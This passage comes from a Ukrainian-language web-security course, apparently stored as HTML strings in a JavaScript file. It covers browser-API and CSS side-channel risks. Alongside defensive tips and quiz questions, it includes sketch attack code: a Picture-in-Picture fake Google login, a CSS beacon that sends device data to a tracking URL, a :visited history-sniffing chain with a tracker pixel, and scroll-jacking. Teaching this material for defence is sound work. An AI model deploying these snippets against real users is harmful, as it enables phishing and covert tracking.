      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання — відео в кутку екрана</span>
<span class="ln">const pipWindow = await documentPictureInPicture.requestWindow({</span>
<span class="ln">  width: 400, height: 300</span>
<span class="ln">});</span>
<span class="ln">pipWindow.document.body.append(videoElement);</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака: UI Spoofing / Фішинг</span>
<span class="ln">// Document PiP дозволяє рендерити БУДЬ-ЯКИЙ HTML</span>
<span class="ln">// у плаваючому вікні БЕЗ адресного рядка</span>
<span class="ln">const pipWindow = await documentPictureInPicture.requestWindow(...);</span>
<span class="ln">// Вставляємо клон форми авторизації Google/банку</span>
<span class="ln">pipWindow.document.body.innerHTML = \`</span>
<span class="ln">  &lt;div class="google-login-clone"&gt;</span>
<span class="ln">    &lt;img src="/fake-google-logo.png" /&gt;</span>
<span class="ln">    &lt;input type="password" placeholder="Введіть пароль" /&gt;</span>
<span class="ln">  &lt;/div&gt;</span>
<span class="ln">\`;</span>
<span class="ln">// Користувач не бачить URL — немає ніяких підказок що це фейк</span></code></pre>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Chrome показує невелику іконку 🔒 та назву сайту в PiP-вікні — завжди перевіряй її перед введенням даних</li>
          <li>Легітимні сервіси (Google, банки) <strong>ніколи</strong> не просять ввести пароль у плаваючому міні-вікні</li>
          <li>PiP-вікно закривається при переключенні вкладок — якщо воно «прилипло» і не зникає, це підозрілий сигнал</li>
          <li>Специфікація W3C активно обговорює обов'язкове відображення origin у PiP-вікні</li>
        </ul>
      </div>
    </section>

    <section class="tip-block tip-block--warn">
      <div class="tip-block__title"><span>⚠️</span> Загальні типові помилки</div>
      <ul>
        <li><strong>«Нові API = безпечні API»</strong>: чим потужніший інструмент, тим більший потенціал для зловживання. Нові API W3C проходять security review, але вразливості в імплементаціях знаходять постійно.</li>
        <li><strong>Ігнорування fingerprinting</strong>: комбінація Vibration + DeviceMotion + WebGL + Canvas fingerprint дає унікальний ідентифікатор стійкіший за cookies.</li>
        <li><strong>Довіра до UI без перевірки origin</strong>: будь-яке вікно без адресного рядка — потенційний фішинг.</li>
      </ul>
    </section>

    <section class="practice-block">
      <div class="practice-block__title"><span>⚡</span> Практика</div>
      <p class="practice-block__intro">Досліди у DevTools (тільки на своїх пристроях!):</p>
      <ol>
        <li>Відкрий консоль на мобільному в Chrome і виконай <code>navigator.vibrate(500)</code> — відчуєш вібрацію 0.5 сек. Потім <code>navigator.vibrate([200,100,200])</code>.</li>
        <li>Знайди будь-який CSS color picker в інтернеті і відкрий EyeDropper. Спробуй навести на інші вікна — що бачиш?</li>
        <li>Перевір який сайт отримав Wake Lock дозвіл: <code>chrome://settings/content/wakeLock</code></li>
        <li>Пошукай у GitHub: «EyeDropper pixel stealing PoC» — подивись на реальні proof-of-concept демонстрації.</li>
      </ol>
    </section>

    <section class="homework-block">
      <div class="homework-block__title"><span>📝</span> Запитання для самоперевірки</div>
      <ol>
        <li>Яким чином Vibration API може бути використаний для стеження без cookies?</li>
        <li>Чому Screen Wake Lock є загрозою фізичної безпеки?</li>
        <li>Що таке «Cross-Origin Pixel Stealing» і який API це дозволяє?</li>
        <li>Чому Document Picture-in-Picture є ідеальним середовищем для фішингу?</li>
        <li>Яка спільна риса всіх чотирьох API з точки зору захисту?</li>
      </ol>
    </section>

    <section class="hw-review-block">
      <div class="hw-review-block__title"><span>📋</span> Типові помилки на співбесідах</div>
      <div class="hw-review-items">
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Що таке Browser Fingerprinting?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «Це те саме що cookies для відстеження».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> Fingerprinting — збір унікального «відбитку» пристрою через комбінацію характеристик: розмір екрану, шрифти, WebGL renderer, Canvas rendering, DeviceMotion від вібрації, часовий пояс та десятки інших параметрів. На відміну від cookies — не зберігається на пристрої і не очищається при очищенні браузера.</p>
        </article>
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Як розпізнати фішинговий PiP?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «У браузері все безпечно, він показує замок».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> PiP-вікна навмисно позбавлені стандартного браузерного chrome (адресного рядка, кнопок навігації). Ознаки фішингу: (1) форма авторизації у міні-вікні без URL, (2) вікно що неможливо закрити звичайними методами, (3) запит чутливих даних у нетиповому контексті.</p>
        </article>
      </div>
    </section>

    <section class="pro-tips-block">
      <div class="pro-tips-block__title"><span>✨</span> Цікаві фішки</div>
      <ul>
        <li><a href="https://coveryourtracks.eff.org/" target="_blank" rel="noopener">coveryourtracks.eff.org</a> (EFF) — тест відбитку вашого браузера. Показує наскільки ви унікальні серед мільйонів відвідувачів.</li>
        <li>Firefox і Safari агресивніше обмежують Device APIs — частково саме через fingerprinting. Chrome зазвичай прийомніший до розробників, але це компроміс з приватністю.</li>
        <li>Privacy Sandbox від Google — ініціатива замінити cookie-трекінг на нові API що агреговано передають дані без ідентифікації конкретного користувача.</li>
        <li>Tor Browser рандомізує більшість fingerprinting-векторів включаючи Canvas і WebGL — ціна: деякі сайти не працюють коректно.</li>
      </ul>
    </section>
`,
  '04-css-sidechannels': `
<article class="lesson-card">
      <h2>Що це таке?</h2>
      <p><strong>Side-channel атаки</strong> — це спосіб отримати інформацію не прямим доступом до даних, а через вимірювання побічних ефектів: часу виконання, трафіку мережі, фізичних характеристик. У вебі це означає витік даних через <em>невидимі механізми</em> CSS та HTML без жодного рядка JavaScript.</p>
      <p>Ці атаки особливо підступні: блокування JavaScript через NoScript або CSP <strong>не захищає</strong> від CSS-only вразливостей.</p>
    </article>

    <section class="analogy-block">
      <div class="analogy-block__title"><span class="analogy-block__icon">🕵️</span> Аналогія: слідкування через тінь</div>
      <p>Side-channel — як стежити за кимось не дивлячись прямо на нього, а відслідковуючи його тінь на стіні. Ти не маєш прямого доступу до даних, але непрямі сигнали розкривають секрети.</p>
    </section>

    <section>
      <h2>🌐 1. CSS Environment Variables (<code>env()</code> та Viewport Segments)</h2>
      <p>CSS-функція <code>env()</code> дає доступ до фізичних розмірів екрана: вирізу камери (notch), сейф-зон, сегментів гнучкого екрана. Ці дані <strong>унікальні для кожної моделі пристрою</strong>.</p>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">/* Легітимне використання — safe area для iPhone notch */</span>
<span class="ln">.container {</span>
<span class="ln">  padding-top: env(safe-area-inset-top);</span>
<span class="ln">  padding-bottom: env(safe-area-inset-bottom);</span>
<span class="ln">}</span>
<span class="ln"></span>
<span class="ln cmt">/* ⚠️ CSS-only Fingerprinting без JavaScript */</span>
<span class="ln cmt">/* Різні пристрої мають різні значення safe-area-inset */</span>
<span class="ln cmt">/* Зловмисник використовує умовні CSS-правила: */</span>
<span class="ln">@supports (padding: env(safe-area-inset-top)) {</span>
<span class="ln">  .tracker {</span>
<span class="ln">    /* Якщо notch = 44px — це iPhone 14 Pro */</span>
<span class="ln">    /* Завантажуємо фонове зображення-маяк */</span>
<span class="ln">    background-image: url('/track?notch=44px&model=iphone14pro');</span>
<span class="ln">  }</span>
<span class="ln">}</span>
<span class="ln"></span>
<span class="ln cmt">/* Це відправить HTTP-запит на сервер зловмисника</span>
<span class="ln cmt">   навіть якщо JavaScript повністю вимкнений! */</span></code></pre>
      </div>

      <div class="syntax-params">
        <h4>Доступні env() змінні для fingerprinting</h4>
        <table class="params-table">
          <thead><tr><th>Змінна</th><th>Що розкриває</th><th>Точність ідентифікації</th></tr></thead>
          <tbody>
            <tr><td><code>safe-area-inset-top</code></td><td>Висота notch/Dynamic Island</td><td>Висока — унікальна для моделі</td></tr>
            <tr><td><code>safe-area-inset-bottom</code></td><td>Висота home indicator</td><td>Середня</td></tr>
            <tr><td><code>viewport-segment-*</code></td><td>Конфігурація складаного екрана</td><td>Дуже висока — складані пристрої рідкісні</td></tr>
            <tr><td><code>titlebar-area-*</code></td><td>PWA titlebar розміри</td><td>Низька сама по собі</td></tr>
          </tbody>
        </table>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Браузери обмежують точність env() значень (rounding) — але характеристичні відмінності між моделями залишаються</li>
          <li>Блокувальники реклами та Privacy Badger перехоплюють підозрілі background-image запити</li>
          <li>Firefox Resist Fingerprinting рандомізує деякі viewport значення</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>🖼️ 2. Native Lazy-Loading (<code>loading="lazy"</code>)</h2>
      <p>Браузер завантажує lazy-зображення тільки коли вони <em>наближаються</em> до viewport. Момент завантаження можна виміряти через мережевий запит — і це розкриває інформацію про структуру сторінки та поведінку користувача.</p>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">&lt;!-- Легітимне використання --&gt;</span>
<span class="ln">&lt;img src="photo.jpg" loading="lazy" alt="Фото" /&gt;</span>
<span class="ln"></span>
<span class="ln cmt">&lt;!-- ⚠️ CSS History Sniffing Attack --&gt;</span>
<span class="ln">&lt;!-- Крок 1: Створюємо посилання на сайт що перевіряємо --&gt;</span>
<span class="ln">&lt;a href="https://sensitive-site.com" id="link"&gt;...&lt;/a&gt;</span>
<span class="ln"></span>
<span class="ln cmt">/* Крок 2: CSS :visited збільшує розмір елемента */</span>
<span class="ln">#link:visited { height: 500px; } /* відвіданий — великий */</span>
<span class="ln">#link          { height: 0; }    /* не відвіданий — невидимий */</span>
<span class="ln"></span>
<span class="ln cmt">&lt;!-- Крок 3: Lazy-зображення розміщено після посилання --&gt;</span>
<span class="ln">&lt;img src="https://tracker.com/pixel.gif" loading="lazy" /&gt;</span>
<span class="ln"></span>
<span class="ln cmt">&lt;!-- Якщо :visited = true → блок збільшується → pixel.gif</span>
<span class="ln cmt">     входить у viewport → браузер завантажує → сервер зловмисника</span>
<span class="ln cmt">     отримує запит → знає що користувач відвідував sensitive-site! --&gt;</span></code></pre>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Браузери вже обмежили що CSS може робити для <code>:visited</code> — дозволено лише зміну кольорів, не розміру. Але дослідники постійно знаходять обходи</li>
          <li><a href="https://github.com/nicowillis/sniffly" target="_blank" rel="noopener">Sniffly</a> — відома PoC демонстрація CSS history sniffing (виправлено в сучасних браузерах)</li>
          <li>Firefox і Chrome постійно посилюють ізоляцію <code>:visited</code> після знаходження нових векторів</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>📜 3. CSS Smooth Scroll (<code>scroll-behavior: smooth</code>)</h2>
      <p>Плавний скролинг уповільнює перехід між позиціями. За допомогою вимірювання часу через <code>IntersectionObserver</code> можна дізнатись про розмір та наявність прихованого вмісту.</p>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">/* Легітимне використання */</span>
<span class="ln">html { scroll-behavior: smooth; }</span>
<span class="ln"></span>
<span class="ln cmt">/* ⚠️ Timing Attack через IntersectionObserver */</span>
<span class="ln cmt">// Якщо smooth scroll активний, час до появи елемента</span>
<span class="ln cmt">// пропорційний відстані скролу → можна виміряти висоту контенту</span>
<span class="ln">const observer = new IntersectionObserver((entries) => {</span>
<span class="ln">  const timeTaken = Date.now() - scrollStart;</span>
<span class="ln">  // timeTaken розкриває розмір сторінки</span>
<span class="ln">  // Якщо блок рекламного трекера заблокований ad-blocker'ом</span>
<span class="ln">  // → він має висоту 0 → скрол швидший → виявляємо ad-blocker</span>
<span class="ln">});</span>
<span class="ln"></span>
<span class="ln cmt">/* ⚠️ Scroll-jacking — утримання на фішинговій сторінці */</span>
<span class="ln">window.addEventListener('scroll', (e) => {</span>
<span class="ln">  // Примусово повертаємо скрол до початку сторінки</span>
<span class="ln">  // Користувач не може «втекти» скролом</span>
<span class="ln">  window.scrollTo({ top: 0, behavior: 'smooth' });</span>
<span class="ln">});</span></code></pre>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Браузери зменшили точність <code>Date.now()</code> і <code>performance.now()</code> (до 1ms) — це ускладнює timing attacks але не унеможливлює їх</li>
          <li>Scroll-jacking порушує UX-принципи і WCAG — правильний захист: ніколи не перехоплюй нативний scroll без явного UX-обгрунтування</li>
          <li>Для свого сайту: <code>overscroll-behavior: contain</code> замість JS-scroll override</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>🔬 Підсумок: ключові теми курсу</h2>
      <div class="syntax-params">
        <table class="params-table">
          <thead><tr><th>Категорія</th><th>API</th><th>Вектор загрози</th><th>Без JavaScript?</th></tr></thead>
          <tbody>
            <tr><td>Permission APIs</td><td>Web Locks</td><td>DoS, Cross-Origin Tracking</td><td>❌</td></tr>
            <tr><td>Permission APIs</td><td>Web Share</td><td>Payload Distribution, Соціальна інженерія</td><td>❌</td></tr>
            <tr><td>Permission APIs</td><td>Clipboard</td><td>Pastejacking, Data stealing</td><td>❌</td></tr>
            <tr><td>Device APIs</td><td>Vibration</td><td>Hardware Fingerprinting, Scareware</td><td>❌</td></tr>
            <tr><td>Device APIs</td><td>Wake Lock</td><td>Фізична безпека, Resource DoS</td><td>❌</td></tr>
            <tr><td>Device APIs</td><td>EyeDropper</td><td>Pixel Stealing, Autofill bypass</td><td>❌</td></tr>
            <tr><td>Device APIs</td><td>PiP</td><td>UI Spoofing, Фішинг</td><td>❌</td></tr>
            <tr><td>CSS & Passive</td><td>CSS env()</td><td>JS-free Fingerprinting</td><td>✅</td></tr>
            <tr><td>CSS & Passive</td><td>Lazy Loading</td><td>History Sniffing</td><td>✅</td></tr>
            <tr><td>CSS & Passive</td><td>Smooth Scroll</td><td>Timing Attack, Scroll-jacking</td><td>✅</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <section>
      <h2>📚 Джерела та ресурси</h2>
      <p>Матеріал базується на аналізі специфікацій W3C, безпекових досліджень та реальних CVE-записів:</p>
      <div class="doc-links">
        <ul>
          <li><a href="https://www.w3.org/TR/permissions/" target="_blank" rel="noopener noreferrer">W3C Permissions API Specification</a></li>
          <li><a href="https://web.dev/articles/security-attacks" target="_blank" rel="noopener noreferrer">Browser Security Attacks — web.dev</a></li>
          <li><a href="https://owasp.org/www-community/attacks/Clickjacking" target="_blank" rel="noopener noreferrer">Clickjacking — OWASP</a></li>
          <li><a href="https://developer.chrome.com/blog/eyedropper" target="_blank" rel="noopener noreferrer">EyeDropper API — Chrome Blog</a></li>
          <li><a href="https://coveryourtracks.eff.org/" target="_blank" rel="noopener noreferrer">Cover Your Tracks — EFF (тест fingerprinting)</a></li>
          <li><a href="https://securityheaders.com/" target="_blank" rel="noopener noreferrer">Security Headers — перевірка HTTP-заголовків вашого сайту</a></li>
        </ul>
      </div>
    </section>

    <section class="tip-block tip-block--warn">
      <div class="tip-block__title"><span>⚠️</span> Типові помилки</div>
      <ul>
        <li><strong>«CSS не може бути небезпечним»</strong>: CSS здатен відправляти мережеві запити (background-image), вимірювати час (через JS + IntersectionObserver), змінювати розміри елементів залежно від стану сторінки.</li>
        <li><strong>«NoScript захищає від всього»</strong>: CSS-only атаки (env() fingerprinting, lazy loading timing) не потребують JavaScript взагалі.</li>
        <li><strong>Ігнорування side-channel в code review</strong>: запитання «чи цей код може розкрити інформацію через побічні ефекти?» має бути частиною security review.</li>
      </ul>
    </section>

    <section class="practice-block">
      <div class="practice-block__title"><span>⚡</span> Практика</div>
      <p class="practice-block__intro">Завдання для закріплення матеріалу:</p>
      <ol>
        <li>Відкрий <a href="https://coveryourtracks.eff.org/" target="_blank" rel="noopener">coveryourtracks.eff.org</a> і подивись свій fingerprint. Яка його унікальність?</li>
        <li>Перевір свій сайт (або будь-який сайт) на <a href="https://securityheaders.com/" target="_blank" rel="noopener">securityheaders.com</a>. Яка оцінка? Які заголовки відсутні?</li>
        <li>Знайди у DevTools Network вкладці запити на <code>background-image</code> що завантажуються з зовнішніх доменів — це потенційні tracking пікселі.</li>
        <li>Вимкни JS у DevTools (Settings → Debugger → Disable JavaScript) і перевір чи блокується відстеження на youtube.com або twitter.com.</li>
      </ol>
    </section>

    <section class="homework-block">
      <div class="homework-block__title"><span>📝</span> Запитання для самоперевірки</div>
      <ol>
        <li>Що таке side-channel атака і чим вона відрізняється від прямого доступу до даних?</li>
        <li>Яким чином CSS env() може відстежувати користувача без JavaScript?</li>
        <li>Поясни механізм History Sniffing через lazy-loading та CSS :visited.</li>
        <li>Що таке scroll-jacking і як він порушує UX та безпеку?</li>
        <li>Яка спільна риса CSS-only атак, що робить їх особливо небезпечними?</li>
      </ol>
    </section>

    <section class="hw-review-block">
      <div class="hw-review-block__title"><span>📋</span> Типові помилки на співбесідах</div>
      <div class="hw-review-items">
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Які є CSS-only вразливості?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «CSS не може бути вразливим, він тільки для стилів».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> CSS може: (1) відправляти мережеві запити через <code>background-image: url()</code> — що дозволяє JS-free tracking через <code>env()</code> fingerprinting; (2) зміняти розміри залежно від стану (:visited, :checked) і цим впливати на те які lazy-resources завантажуються; (3) Timing attacks через smooth scroll і IntersectionObserver.</p>
        </article>
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Що перевіряти в security review фронтенду?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «Тільки XSS і CSRF» — неповна відповідь.</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> Чеклист: (1) CSP-заголовок — блокує XSS, (2) CORS — тільки дозволені origins, (3) SameSite cookies — проти CSRF, (4) Subresource Integrity для CDN-скриптів, (5) зовнішні <code>background-image</code> запити — tracking пікселі, (6) дозволи браузера — які запитуємо і навіщо, (7) HTTP Security Headers — <code>securityheaders.com</code> дасть оцінку.</p>
        </article>
      </div>
    </section>

    <section class="pro-tips-block">
      <div class="pro-tips-block__title"><span>✨</span> Цікаві фішки</div>
      <ul>
        <li>Специфікація <strong>CSS Containment</strong> (<code>contain: content</code>) ізолює елемент від зовнішнього layout впливу — це зменшує деякі side-channel витоки що залежать від розміру елементів.</li>
        <li><strong>Privacy Budget</strong> — пропозиція W3C: браузер відстежує скільки "приватної інформації" вже розкрито скриптами та CSS, і блокує нові запити що перевищують ліміт.</li>
        <li>Двофакторна автентифікація робить useless крадіжку паролів через pastejacking або clipboard reading — навіть якщо пароль вкрадено, аккаунт залишається захищеним.</li>
        <li>Chrome <strong>Privacy Sandbox</strong> та <strong>Topics API</strong> — спроба Google замінити cross-site tracking на less invasive альтернативи з вбудованим privacy budget.</li>
      </ul>
    </section>
`,
};
